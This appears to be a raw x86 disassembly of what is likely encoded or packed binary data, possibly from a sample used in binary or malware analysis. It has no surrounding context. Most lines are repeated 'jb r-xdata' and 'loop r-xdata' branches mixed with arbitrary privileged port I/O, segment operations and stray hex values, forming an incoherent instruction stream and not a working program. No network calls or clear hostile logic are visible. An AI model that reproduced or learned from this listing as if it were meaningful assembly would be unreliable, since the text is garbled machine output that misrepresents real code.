jb r-xdata
or ebx [ edx + 0x721d1d38 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
push ss
mov dl ah
or eax [ edx ]
popad
jb r-xdata
jb r-xdata
xor al 0x1d
mov ah 0xb5
or al [ edi ]
mov dl [ ebx ]
jb r-xdata
sbb al 0xb
jb r-xdata
or ecx [ es : eax + 0x1a ]
sbb bl [ bx ]
sbb eax 0xc2320b1d
loop r-xdata
push ds
sbb eax 0x2267aeb4
or edx [ ebx ]
adc ebx [ 0xffffffffa725721d ]
outsd
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
insb
mov [ edx - 0x20 ] 0xe2
loop r-xdata
or esp [ edx - 0x20 ]
leave
jb r-xdata
jb r-xdata
jb r-xdata
mov eax [ 0x18930bf6 ]
jb r-xdata
jb r-xdata
mov esi [ ebx - 0x424444e3 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
0x1d0f510a 0xb1d
loop r-xdata
pop es
sbb eax 0x7272721d
jb r-xdata
mov ebx 0x2267bdbb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmp [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
mov dh 0x67
jb r-xdata
dec [ ebx + 0x26541da2 ]
jb r-xdata
push esp
jb r-xdata
sahf
jb r-xdata
sbb eax 0xb51d3e97
jb r-xdata
cmpsd [ esi ] [ edi ]
mov ah 0xae
and cl [ bp + di ]
jb r-xdata
jb r-xdata
adc [ edx + 0x1d0c110b ] bh
sbb eax 0x72727272
jb r-xdata
mov bh al
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
mov esp [ edx ]
jb r-xdata
sbb eax 0x9269721d
fsubrp st1
adc ch ch
push ebp
mov dl 0x69
and al 0xa
jb r-xdata
test [ ecx - 0x26 ] ah
sbb eax 0xaa76f1d
jb r-xdata
jb r-xdata
sbb eax 0xbdbbbb1d
jb r-xdata
sbb [ 0x7272721d ] bl
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
mov ebp 0x67ed2267
jb r-xdata
jb r-xdata
loop r-xdata
rol ebx 0xe2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
or ebx [ esi ]
and ch ch
jb r-xdata
test eax 0x72e2e2ff
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
out 0xe3 al
loop r-xdata
sbb eax 0x14d1b21d
jb r-xdata
0x26a79b22
jb r-xdata
movsb [ edi ] [ esi ]
mul [ ecx + 0x26 ]
out dx al
test [ ebx - 0x59 ] ch
or ebp [ edi - 0x3e ]
loop r-xdata
in ax 0xc7
and ch ch
jb r-xdata
sbb eax 0xb414d1b2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and ah [ esi - 0x1e ]
loop r-xdata
je r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov dl dh
jb r-xdata
jb r-xdata
outsd
jb r-xdata
mov [ edx - 0x1d153ff5 ] dl
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
and ch ch
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
shl [ ss : edx ] 0x1
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov esp 0x72212bb9
jb r-xdata
adc edi edi
loop r-xdata
jb r-xdata
jb r-xdata
or ebx [ 0x72e2e2c7 ]
out dx al
adc eax 0xa222f93a
sub esp [ ecx ]
jb r-xdata
jb r-xdata
or ecx esp
adc al 0x1d
sbb eax 0x3b9d0a72
sbb eax 0x2267aeb5
or esp [ ebx + 0x35 ]
sbb eax 0x7272721d
mov ah dh
jecxz r-xdata
mov dl 0xd1
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
rcl [ esp + esi * 4 ] 0x1
jb r-xdata
jb r-xdata
pop esi
jb r-xdata
jb r-xdata
loop r-xdata
imul esi [ edi + 0x3e ] 0x6b1d1d1f
jbe r-xdata
and cl [ bp + di ]
arpl [ 0x72721d1d ] si
jb r-xdata
scasb [ edi ]
loop r-xdata
loop r-xdata
loop r-xdata
outsd
imul esp [ edi - 0x3d7745fa ] 0xffffff84
imul esp [ edi - 0x2f7745fc ] 0xffffff84
imul esp [ edi + 0xb4c0b0a ] 0x1d
sbb eax 0xfb0b7272
out 0xe2 eax
loop r-xdata
ja r-xdata
adc al 0xb4
jb r-xdata
jb r-xdata
outsd
jb r-xdata
jb r-xdata
sub esp [ ecx ]
jb r-xdata
jb r-xdata
bound eax [ esi - 0x1e ]
loop r-xdata
and ch dl
mov dl 0x1d
xchg edi eax
push es
sbb eax 0xac69feb5
0x7e0b
jb r-xdata
or cl [ ebx + 0x30 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edx [ ebx + 0x721d1d18 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov cl 0x8a
jb r-xdata
jb r-xdata
fstp [ esi + 0x66edf6c6 ]
0x8ae2e2e2 0xd87a
mov ah 0xa
jb r-xdata
jb r-xdata
retn 0xe2e2
and cl [ ebx ]
jb r-xdata
or ebx [ eax - 0x3e ]
shl [ edx ] 0x1
jb r-xdata
pop ds
and cl [ bp + di ]
cli
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x5e64691d
in al 0x3c
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x1ea72572
popad
scasd [ edi ]
push ds
or ebx [ eax + 0xb1d1d12 ]
cmp eax 0x72721d1d
mov dl 0xa
imul ebx [ ebx + ecx ] 0x1d1d0454
jb r-xdata
or ebp [ ecx + 0x72e2e2ff ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x9d0a721d
jb r-xdata
jb r-xdata
outsd
or ecx [ eax + 0x1a ]
call 0x26a79b22
arpl [ esi ] cx
jb r-xdata
jb r-xdata
loop r-xdata
in eax 0xc7
jb r-xdata
jb r-xdata
jb r-xdata
cli
int3
mov ah 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
and eax 0xe2e2e228
jb r-xdata
jb r-xdata
outsd
cmp bh cl
and ah [ edx + 0x7272212b ]
jb r-xdata
jb r-xdata
pop ds
sbb eax 0xea766b1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov [ 0x7272212b ] al
popad
jb r-xdata
xchg edi eax
sbb ch [ ebx - 0x59 ]
xor cl [ ebx ]
inc eax
0xe2e2
xor [ 0xffffffffee26611d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0xb4
or ecx ebp
mul dl
loop r-xdata
sbb bl [ 0xaa76f1d ]
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
dec ebx
jb r-xdata
jb r-xdata
pop eax
jb r-xdata
jb r-xdata
and cl [ ebx ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x810bbeb5
jb r-xdata
jmp edx
mov ebp 0x212bb9bc
jb r-xdata
jb r-xdata
jb r-xdata
dec esi
loop r-xdata
sbb eax 0x2267b2b5
or esp [ esi - 0x20 ]
loop r-xdata
mov bh 0x69
jb r-xdata
jb r-xdata
or esi [ eax - 0x4 ]
jb r-xdata
jb r-xdata
jb r-xdata
adc [ ebx ] cl
jb r-xdata
jb r-xdata
sahf
mov ch 0xae
outsd
jb r-xdata
popad
in eax dx
pushad
push esi
out 0xe2 al
loop r-xdata
loop r-xdata
jb r-xdata
in eax dx
in al 0xe2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
ja r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
retn
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0xb20aa76f
mov ah 0xb
int 0xf6
jb r-xdata
jb r-xdata
mov esp [ edx - 0x1dd9abe3 ]
jb r-xdata
in eax dx
push esp
in eax 0xb
out dx eax
or eax 0x69721d1d
and ebp ebp
xor [ 0x22611d1d ] bl
loopne r-xdata
sbb eax 0xee26611d
sbb eax 0x1d362a0b
imul esp [ edi + 0x34090a1e ] 0x1d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xe2e24e74
jb r-xdata
aaa
push ds
jb r-xdata
and ah dl
loop r-xdata
imul esp [ esi + ebx * 2 - 0x1e ] 0x6c69e2e2
mov esi 0xe2fe810b
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ebp [ edi + 0x12980b1e ] 0x650b1d1d
cmp eax 0x72721d1d
jb r-xdata
jbe r-xdata
cmp ebx [ 0xfffffffffa26611d ]
popfd
jb r-xdata
or esp [ ecx ]
or bl [ 0xffffffff9a0bb71d ]
in eax dx
loop r-xdata
cld
jb r-xdata
jb r-xdata
jo r-xdata
jb r-xdata
leave
jb r-xdata
sbb [ 0xffffffffe3750a1d ] ebx
adc bl [ ecx ]
jb r-xdata
mov esp 0x84c08821
jb r-xdata
jb r-xdata
mov [ ecx + 0x3aa76b84 ] dl
mov edx 0x930b8188
in eax dx
push ebp
popad
and esp eax
shl [ edx ] 0x1
outsd
mov eax 0xefd40b32
loop r-xdata
in al 0xe2
test [ ebx - 0xa ] ch
xchg ebx eax
movsb [ edi ] [ esi ]
fst [ edx ]
sbb eax 0x3fa066ed
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or al [ edi + 0xb1d1d33 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ch
0xffffe2e2 0x8ae2
and esp eax
or cl [ ecx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
cmpsd [ esi ] [ edi ]
or dh [ edx - 0x932f44c ]
imul esp [ edx + 0x46 ] 0x61e2e2e2
xchg edx eax
or eax eax
0x7272e2e2 0x971d
sbb eax 0xe2e22654
jb r-xdata
and bl [ 0x69721d1d ]
cmpsd [ esi ] [ edi ]
push ds
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
dec esi
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
cmp esi 0x7272e2e2
mov [ 0x1d18e70b ] al
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xfa26611d
loop r-xdata
loop r-xdata
jb r-xdata
sbb eax 0xbe6881d
scasb [ edi ]
add eax 0x84721d1d
imul esp [ edi - 0x697745fa ] 0xb
fsubr st5
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or bl [ ebp + 0x611d1d3b ]
jb r-xdata
sbb eax 0xe3750a1d
imul esp [ edi - 0x494ae2ca ] 0x67
jb r-xdata
jb r-xdata
xchg edi eax
sbb eax 0xbf6b1297
jb r-xdata
jb r-xdata
loop r-xdata
mov ebx 0x62e36986
0x1c0be2e0 0x1d37
sbb eax 0xd1727272
xchg ebp eax
jb r-xdata
sbb eax 0xce0bea97
cmc
loop r-xdata
in eax dx
mov al [ 0x1d1d1d3f ]
xchg edi eax
out dx al
imul ecx [ esi ] 0x1e8761b3
in eax dx
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb eax 0x2267b6b5
sbb eax 0x66ed721d
xor ebx [ 0x1bc0b1d ]
jb r-xdata
rol bx 0xe2
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
xor al 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]

loop r-xdata
jb r-xdata
or [ ebx + 0x362a0b1d ] esi
jb r-xdata
lahf
push ds
jb r-xdata
imul ebx [ edi - 0x5ef44de2 ] 0x3d
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xe25e6469
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ah 0x69
adc ch ch
jb r-xdata
jpe r-xdata
sub eax 0x72721d1d
mov eax 0x88bb9488
test [ ecx + 0x20 ] ebp
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
or eax esp
jb r-xdata
in al 0xb5
mul [ es : edi + 0x22 ]
sub dh [ ebp - 0x1d0506f6 ]
loop r-xdata
adc ch [ ebx - 0x41 ]
jb r-xdata
sbb eax 0x72727272
jb r-xdata
and ch [ ebx - 0x59 ]
jb r-xdata
enter 0xe2c4 0xe2
sar [ ebx + 0x69e36986 ] cl
mov [ 0x1ea76bea ] al
or edi esi
in eax dx
loop r-xdata
jb r-xdata
sbb eax 0x1d01bc0b
jb r-xdata
int3
imul esp [ ecx + 0x18930bf6 ] 0x72721d1d
out dx al
jb r-xdata
jb r-xdata
jb r-xdata
and esi [ ebx ]
sbb ah [ ecx ]
jb r-xdata
and dl [ 0x1d1d ]
outsd
movsd [ edi ] [ esi ]
jecxz r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x9f6b841d
sbb eax 0x362a0b1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
imul ebp [ edx - 0x1e ] 0x228be2e2
pop esi
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov [ esp + eax * 4 - 0x45ed5895 ] al
mov [ ebx + 0x1d335f0b ] cl
sbb eax 0x72727272
jb r-xdata
cmp al [ ebx + ebp * 2 + 0x3b69eebf ]
test [ ebx - 0x41 ] ch
in al dx
or ebp [ ebx - 0xb ]
loop r-xdata
in eax dx
push esp
sbb cl cl
and eax 0xe2f75b0b
loop r-xdata
imul edx [ edx ] 0xb5e454ed
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
imul esp [ ss : ebx ] 0x34a76b84
mov edx 0x6b849188
cmpsd [ esi ] [ edi ]
cmp bh [ edx - 0x6cf47e78 ]
mov [ ebx + edi * 4 + 0x20698588 ] dl
sbb eax 0x67fa2661
jb r-xdata
jb r-xdata
mov edi 0xf90ab52a
jb r-xdata
jb r-xdata
jb r-xdata
push ss
rcr [ 0x65f9669 ] 0x1
cmpsd [ esi ] [ edi ]
in eax dx
sbb ax 0xe2f4
jb r-xdata
jb r-xdata
loop r-xdata
mov esp 0x721d1d01
jb r-xdata
jb r-xdata
sub dh [ esi ]
jb r-xdata
mov [ 0xffffffffe226541d ] al
jb r-xdata
jb r-xdata
popad
cmp al 0xb
or ebp [ edx ]
jb r-xdata
jb r-xdata
sbb bl [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
outsd
arpl [ 0xffffffffe2e2e228 ] sp
jb r-xdata
mov ch 0xb
mov dl 0xa
xchg ebx eax
das
sbb eax 0xee971d1d
sbb eax 0x3fa066ed
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
push esp
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
xchg esi eax
or ebx eax
in eax dx
popad
cli
loop r-xdata
mov ch 0xa
stc
sbb eax 0x72727272
jb r-xdata
jb r-xdata
shr [ ebx ] 0x1
imul edi [ edi + 0x31346916 ] 0x16a71d18
and cl [ ebx ]
test [ ebx - 0x59 ] ch
push cs
mov cl 0x3e
loop r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
shl [ edx ] 0x1
jb r-xdata
jb r-xdata
sbb eax 0xc166ed72
sbb eax 0xb1727272
or edx [ esp + eax + 0x1d ]
jb r-xdata
sbb eax 0x9f6b841d
jb r-xdata
and cl [ ebx ]
jb r-xdata
sbb eax 0x3ce40a1d
jb r-xdata
jb r-xdata
sub dl ah
jb r-xdata
jb r-xdata
jb r-xdata
or ebp ebp
loop r-xdata
push cs
mov bl 0x61
xchg [ esi ] ebx
and cl [ ebx ]
and [ edx ] ecx
sbb eax 0x9a0bb71d
enter 0xe2c4 0xe2
pop ss
sbb eax 0x32be0b1d
sbb eax 0xd122d11d
imul esp [ edi + 0x72212b1e ] 0x72727272
jb r-xdata
add ch [ edi - 0x51 ]
push 0xffffffa7
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edx [ edx ] 0x976b84
jb r-xdata
jb r-xdata
jb r-xdata
popad
and ebp edx
push 0xffffffb6
jmp [ esi ]
push ss
or esp edx
shl edx 0xe2
jb r-xdata
sbb [ 0x236116a7 ] bl
mov edx 0x6b848b88
cmpsd [ esi ] [ edi ]
or al 0xba
mov [ esi + 0xea76b84 ] dl
jb r-xdata
sbb eax 0x1bc0b1d
fidiv [ ebp + 0x33870ab2 ]
jb r-xdata
test [ ebx - 0x61 ] ch
jb r-xdata
add al 0x1d
jb r-xdata
sbb eax 0x3c9f6b84
jb r-xdata
jb r-xdata
or ah ah
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
add ecx [ edi ]
sbb eax 0x6b72721d
cmpsd [ esi ] [ edi ]
push cs
shl [ edx ] 0x1
imul esp [ edi + 0x691dd116 ] 0xffffff96
pop edi
push es
and cl [ bp + di ]
jb r-xdata
mov esp 0xb50b3c69
in al 0xe2
loop r-xdata
0x6b841269 0x97
jb r-xdata
imul esp [ edi + 0x1eaf691e ] 0x69
sahf
outsd
or cl [ ebx ]
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
mov [ 0x6b12971d ] bl
jb r-xdata
outsd
jb r-xdata
jb r-xdata
mov [ ebx + 0x1d1da40b ] al
sbb eax 0x72727272
jb r-xdata
sbb eax 0x23617272
jb r-xdata
test [ ebx - 0x69 ] ch
jb r-xdata
mov edx 0x12699a88
jb r-xdata
jb r-xdata
xor al 0x1d
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
lahf
jb r-xdata
jb r-xdata
imul ebx [ edi - 0x564f4c4 ] 0xffffffe2
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
cmp al 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
adc al [ ebx + ebp * 2 + 0x69bc0097 ]
jb r-xdata
push ds
jb r-xdata
push es
scasd [ edi ]
scasd [ edi ]
and eax 0xb4a906a7
jb r-xdata
jb r-xdata
pop ds
jb r-xdata
and eax 0xb4a906a7
jb r-xdata
in al dx
and eax 0x87902aa7
mov ah 0xaf
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add [ ecx + ebp * 2 - 0x1b4af4c4 ] bh
xchg edi eax
jb r-xdata
mov dl 0xed
jb r-xdata
jb r-xdata
xchg [ ebx ] esi
jb r-xdata
or ebx [ ebx + 0x72e2e2fa ]
jb r-xdata
jb r-xdata
jb r-xdata
or bl bl
stc
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add bh [ edx + 0x12699a88 ]
jb r-xdata
jb r-xdata
test eax 0xba9afb4
inc ebp
jmp edx
jb r-xdata
and eax 0x83952ea7
and eax 0xafb426a7
mov ch 0xe4
imul edx [ edi + 0x3c69bc00 ] 0xb
jb r-xdata
scasd [ edi ]
push ds
imul ebx [ esi + 0x4f0b0a6f ] 0x721d1d34
mov eax 0xe2c1e20b
loop r-xdata
push es
jb r-xdata
jb r-xdata
sbb eax 0x1d3ce40a
cmpsd [ esi ] [ edi ]
jb r-xdata
xor ch al
loop r-xdata
jb r-xdata
jb r-xdata
mul dl
loop r-xdata
jb r-xdata
and esi esi
imul ebp [ edi + 0x18af0b1e ] 0x1d
sbb eax 0x72727272
in eax dx
jb r-xdata
imul esp [ edi + 0xb2c694c ] 0xffffff8b
hlt
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esi [ ecx + esi ] 0x16a71d18
jb r-xdata
jb r-xdata
jb r-xdata
cli
jb r-xdata
mov cl 0x1d
mov ch 0xb2
and cl [ bp + di ]
loopne r-xdata
jb r-xdata
imul ebx [ edx ] 0xe2c4950b
fwait
jb r-xdata
mov ah 0xaa
jb r-xdata
mov [ edx + 0x6b841269 ] bl
jb r-xdata
jb r-xdata
mov [ 0x1d00bf0b ] al
sbb eax 0x72727272
jb r-xdata
jb r-xdata
dec edi
test eax 0xe2ff450b
loop r-xdata
mov ah 0xaf
jb r-xdata
xchg ebp eax
and [ 0xffffffff87902aa7 ] 0xffffffb4
scasd [ edi ]
cmpsd [ esi ] [ edi ]
mov ah 0xaf
in eax dx
jb r-xdata
or eax [ esi - 0x39 ]
loop r-xdata
jb r-xdata
in eax dx
imul esi [ ebx ] 0x38b76b84
jb r-xdata
fdivr [ edx + 0x1d398d0b ]
popad
and ah al
in eax dx
push ebp
shl [ ecx + 0x23 ] cl
loopne r-xdata
sbb [ 0x55edb51d ] ebx
not [ ebx + 0x1d393a0b ]
sbb eax 0x72727272
jb r-xdata
loop r-xdata
imul ecx [ esi ] 0x1a69b5b3
or ebp [ ecx + 0x6be2e2f1 ]
xor [ ebx - 0x59 ] ch
imul esp [ edi - 0x7bda96c4 ] 0x6b
cmpsd [ esi ] [ edi ]
or cl ah
cmc
loop r-xdata
popad
jb r-xdata
cmp al 0xb
in eax dx
0x26ffb66a 0x1b61
xor [ eax ] ebx
sbb eax 0x236116a7
jb r-xdata
jb r-xdata
or edi [ ecx + eax - 0x128de2e3 ]
jb r-xdata
loop r-xdata
jb r-xdata
imul ecx [ esi ] 0x631a0661
push cs
push ds
loop r-xdata
jb r-xdata
retn 0x60ed
push ebp
in eax 0xb
in eax dx
cmpsd [ esi ] [ edi ]
push ds
sbb eax 0x362b0b1d
sbb eax 0x7272721d
jb r-xdata
cmpsd [ esi ] [ edi ]
adc dh [ ecx + 0x2f930ab2 ]
imul edi [ ebx + ecx ] 0xe2e2e4b5
jb r-xdata
or edi [ edi + 0x721d1d00 ]
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
loope r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
push cs
imul esp [ edi + 0x12a76b16 ] 0x1d1dd90b
sbb eax 0x72727272
cmpsd [ esi ] [ edi ]
or ch [ ecx - 0x59 ]
sbb ch [ ebx - 0x59 ]
adc al 0xed
cmp [ bp + si ] cl
sbb eax 0xbc22d11d
or esi esp
jb r-xdata
jb r-xdata
sbb eax 0xf655edb5
xchg ebx eax
or edi [ edx ]
cmp [ 0x7272721d ] ebx
imul ebx [ ebx - 0x1239396a ] 0x1d318467
sbb eax 0xe2f5cc0a
loop r-xdata
loop r-xdata
fidiv [ ebx - 0x9d99ee3 ]
mov dl [ esi ]
jecxz r-xdata
sbb eax 0x72727272
jb r-xdata
loop r-xdata
or eax [ ebx + 0x721d1d31 ]
jb r-xdata
imul [ ebx - 0x51 ]
push ds
or ebp [ edi + 0x721d1d18 ]
jb r-xdata
mov bh 0x69
push cs
mov bl 0xb5
imul ebx [ edx ] 0xe2f1a90b
loop r-xdata
sbb [ 0xffffffff8a72721d ] ebx
loop r-xdata
sbb [ 0x550bb21d ] ebx
loop r-xdata
xchg esi eax
jb r-xdata
add [ 0x66ed721d ] ebx
jb r-xdata
jb r-xdata
sbb eax 0x30d122d1
jb r-xdata
and [ bx + di ] ebx
sbb eax 0x550bb21d
jb r-xdata
adc [ eax - 0x1312f479 ] 0xffffffe2
xchg ebp eax
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
or edi edx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov eax 0x300bd388
mov bh 0x38
jb r-xdata
loop r-xdata
jb r-xdata
sbb cl dl
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xor [ ecx ] 0x1d
sbb eax 0x72727272
sbb eax 0x72727272
sbb eax 0x961deab5
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov edi 0x721d1d33
jb r-xdata
jb r-xdata
sbb [ 0x7272721d ] bl
mov bh 0x16
imul esp [ edi + 0xaa76b1e ] 0x6b1aa769
mov cl 0xb
aam 0x37
sbb eax 0x7272721d
jb r-xdata
imul esp [ edi - 0x747745f2 ] 0xffffff84
imul esp [ edi - 0x7b7745f4 ] 0xffffff84
imul esp [ edi - 0x747745ee ] 0xb
pop edi
xor ebx [ 0x7272721d ]
jb r-xdata
push 0x1269b4f3
jb r-xdata
jb r-xdata
and dl cl
jb r-xdata
sub esp [ ecx ]
jb r-xdata
outsd
nop
xchg [ ebx ] ecx
jb r-xdata
scasd [ edi ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
shl [ edx ] 0x1
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
imul esp [ edi - 0x77dd2ee8 ] 0xffffff9a
cli
jb r-xdata
jb r-xdata
outsd
mov dl 0xed
loop r-xdata
loop r-xdata
jb r-xdata
and cl [ eax - 0x4a2f466 ]
jb r-xdata
jb r-xdata
jb r-xdata
xor eax [ ebx + ebp * 2 - 0x7747c749 ]
ror [ ebx ] cl
jb r-xdata
jb r-xdata
sbb ch [ esi ]
adc cl [ ebx ]
fstp [ 0x72721d1d ]
jb r-xdata
mov bl [ edx ]
and eax 0x2a76b84
mov ch 0xea
sbb eax 0x1deac696
mov ch 0xce
or ebp [ esi ]
sub ebx [ 0x7272721d ]
jb r-xdata
mov dl ah
jb r-xdata
jb r-xdata
lodsb [ esi ]
inc si
mov ah 0xd9
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
imul esp [ edi + 0x1aa7690a ] 0x6b
test [ ecx - 0x24 ] ah
loop r-xdata
adc ch [ edx - 0x59 ]
push 0xffffffa7
jb r-xdata
or eax [ esi + 0x72e2e2ce ]
jb r-xdata
loopne r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
call 0x69fa5fd8
sbb cl [ edx ]
jb r-xdata
cmp [ 0xffffffffec66ed1d ] bl
mov al [ 0x1a69b4a0 ]
or ch [ ecx + 0x1 ]
sbb eax 0xf226611d
imul edi [ edx ] 0x3d0b1d67
and eax 0xa9af0ea7
mov ah 0xaf
and eax 0x8baf36a7
adc [ eax - 0x1d05f4f5 ] 0x727272e2
jb r-xdata
sbb eax 0xe2ec66ed
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov ah dl
jb r-xdata
mov bh 0x1e
jb r-xdata
0xe2fb5d0b 0x72e2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xor cl ah
loop r-xdata
imul esi [ edi - 0x2c7747c8 ] 0xb
jb r-xdata
jb r-xdata
mov ecx 0x7272212b
jb r-xdata
adc al 0x1d
jb r-xdata
imul ebp [ edi - 0x58947bbc ] 0x4c
jb r-xdata
imul esp [ esi + edi - 0x1e ] 0xffffffe2
jb r-xdata
jb r-xdata
sbb ebp ebp
jb r-xdata
imul ebx [ edi ] 0x1d
jb r-xdata
into
jb r-xdata
loop r-xdata
xchg dh cl
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
mov cl [ ecx - 0x4b5f5f18 ]
loop r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
push cs
scasd [ edi ]
test eax 0xa725afb4
scasd [ edi ]
mov eax [ ecx - 0x5f4f470 ]
in al dx
jb r-xdata
mov [ edx - 0x1d04a2f5 ] bl
loop r-xdata
jb r-xdata
mov eax ebp
pop ebp
in al dx
jb r-xdata
jb r-xdata
sbb eax 0xec66ed1d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
outsd
jb r-xdata
pushad
fistp [ ebx + 0x56a76a1d ]
jb r-xdata
jb r-xdata
sar [ ecx ] 0x1
jb r-xdata
jb r-xdata
cmp [ eax + 0x300bd388 ] bh
jb r-xdata
push ebp
loop r-xdata
jb r-xdata
imul esp [ esi - 0x7745213a ] 0xffffff87
imul ebp [ ebx + ecx ] 0xe2e2f48b
jb r-xdata
inc esp
loop r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
imul ebp [ edi + 0x6f9e691e ] 0x344f0b0a
jb r-xdata
lodsb [ esi ]
sbb eax 0xed22671d
popfd
call 0xffffffffbde8a1e3
mov ecx 0x7272212b
jb r-xdata
loop r-xdata
jb r-xdata
or ebx [ ebp - 0x5 ]
sub al 0x1d
sbb eax 0xbeabfdb
loop r-xdata
mov cl 0xd1
imul ebx [ edx ] 0x1d01690a
sbb eax 0x69f22661
cmp ah [ edi + 0x1d ]
or edi [ 0xffffffffed1d1d38 ]
test cl bl
sub eax 0xe2e467ed
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
imul ebp [ edx ] 0x18a76b84
mov ebx 0x16af6b84
jb r-xdata
outsb
jb r-xdata
pop ds
jb r-xdata
or eax [ ebx ]
jb r-xdata
adc ch [ ecx + 0x2a ]
mov ah cl
test [ ebx - 0x51 ] ch
adc [ ebx + 0x16af6b84 ] bh
add ebx [ 0xffffffff8872721d ]
jb r-xdata
jb r-xdata
jb r-xdata
